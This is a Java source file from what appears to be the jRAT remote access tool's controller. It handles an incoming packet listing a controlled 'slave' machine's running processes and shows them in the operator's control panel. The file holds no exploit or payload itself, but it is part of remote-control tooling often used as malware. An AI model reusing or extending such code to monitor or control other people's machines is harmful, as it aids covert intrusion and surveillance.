package io.jrat.controller.packets.incoming;

import io.jrat.common.ProcessData;
import io.jrat.controller.Slave;
import io.jrat.controller.ui.frames.FrameControlPanel;
import io.jrat.controller.ui.frames.FrameRemoteProcess;
import io.jrat.controller.ui.panels.PanelControlRemoteProcess;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import javax.imageio.ImageIO;

public class Packet25Process extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		try {
			FrameRemoteProcess frame = FrameRemoteProcess.INSTANCES.get(slave);
			FrameControlPanel framecp = FrameControlPanel.instances.get(slave);

			int count = dis.readByte();

			String[] data = new String[count];

			for (int i = 0; i < count; i++) {
				data[i] = slave.readLine();
			}
			
			BufferedImage icon = null;
			
			if (dis.readBoolean()) {
				byte[] bIcon = new byte[dis.readInt()];
				dis.readFully(bIcon);
				icon = ImageIO.read(new ByteArrayInputStream(bIcon));
			}
			
			ProcessData processData = new ProcessData(data, icon);

			if (frame != null) {
				frame.getPanel().getModel().addRow(new Object[] { processData });
			}

			if (framecp != null) {
				PanelControlRemoteProcess panel = (PanelControlRemoteProcess) framecp.panels.get("remote process");
				panel.getModel().addRow(new Object[] { processData });
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
